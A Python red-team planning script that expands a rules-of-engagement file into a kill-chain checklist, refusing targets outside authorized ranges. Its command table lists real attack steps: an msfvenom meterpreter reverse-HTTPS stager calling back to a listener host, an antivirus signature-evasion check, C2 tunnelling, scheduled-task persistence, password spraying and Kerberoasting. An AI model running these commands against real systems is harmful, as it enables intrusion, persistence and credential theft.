#!/usr/bin/env python3
"""红队交战计划器：把 ROE 展开成带判定信号与证据槽的 kill-chain；越界目标硬失败。"""
import argparse, ipaddress, json, sys

class OutOfScope(RuntimeError): pass

CHAIN = [
 ("recon",   "host_discovery",  "nmap -sn {t} -oG -",                     "Host: {t} Status: Up"),
 ("recon",   "service_enum",    "nmap -sV -sC -p- {t} -oX r.xml",         "<port protocol=...> 计数 > 0"),
 ("recon",   "web_surface",     "ffuf -u http://{t}/FUZZ -w WL -mc 200,301,302,403 -ac", "命中行数 > 0"),
 ("exploit", "cve_triage",      "nuclei -u http://{t} -t cves/ -severity high,critical", "[cve-id] 行出现"),
 ("exploit", "poc_validate",    "python3 poc.py --target {t} --safe",     "返回码 0 且 marker 回显"),
 ("exploit", "shell_stabilize", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "id 输出 uid 变化"),
 ("payload", "stager_build",    "msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT=443 -f exe -o PAYLOAD.exe", "文件生成且 msf 会话 Establ"),
 ("payload", "loader_check",    "python3 checkv.py PAYLOAD.exe",          "静态特征命中数 = 0"),
 ("c2",      "profile_load",    "c2ctl profile apply PROFILE_NAME",       "心跳间隔偏差 < 20%"),
 ("c2",      "session_route",   "c2ctl route add {t} --chain SERVER_A",   "socks 隧道可达 内网段"),
 ("evasion", "amsi_map",        "python3 amsi_probe.py --host {t}",       "可疑 ETW/AMSI 通道清单非空"),
 ("persistence","foothold",     "schtasks /create /sc onlogon ...",       "schtasks /query 回显任务"),
 ("credtest","lockout_math",    "python3 spray.py --policy lockout.json --dry-run", "预计失败次数 < 阈值"),
 ("credtest","kerb_enum",       "impacket-GetUserSPNs DOMAIN/user:pw -dc-ip {t}", "SPN 列表非空"),
 ("exploitdev","crash_triage",  "python3 triage.py --crash CRASH_1",      "EIP/RIP 可控 = True"),
 ("exploitdev","offset_find",   "python3 offset.py --pattern PATTERN_LEN", "偏移量 OFFSET_1 稳定复现>=3次"),
]

def net_of(cfg):
    return [ipaddress.ip_network(c) for c in cfg["authorized_cidrs"]]

def check(cfg, target):
    ip = ipaddress.ip_address(target)
    if target in cfg["exclude_hosts"]: raise OutOfScope(f"excluded: {target}")
    if not any(ip in n for n in net_of(cfg)): raise OutOfScope(f"outside ROE: {target}")

def build(cfg, target):
    check(cfg, target)
    steps = [{"n": i+1, "phase": p, "action": a, "cmd": c.format(t=target, lhost=cfg.get("lhost","LHOST")),
              "signal": s, "evidence_slot": f"evidence/{i+1:02d}_{a}.log"}
             for i, (p, a, c, s) in enumerate(CHAIN) if p in cfg["allow"]]
    return {"engagement": cfg["engagement"], "target": target, "window_utc": cfg["window_utc"],
            "steps": steps, "denied": cfg["deny"]}

if __name__ == "__main__":
    ap = argparse.ArgumentParser(); ap.add_argument("--roe", required=True); ap.add_argument("--target", required=True)
    a = ap.parse_args(); cfg = json.load(open(a.roe))
    try:
        print(json.dumps(build(cfg, a.target), indent=2, ensure_ascii=False))
    except OutOfScope as e:
        print(f"REFUSED: {e}", file=sys.stderr); sys.exit(2)
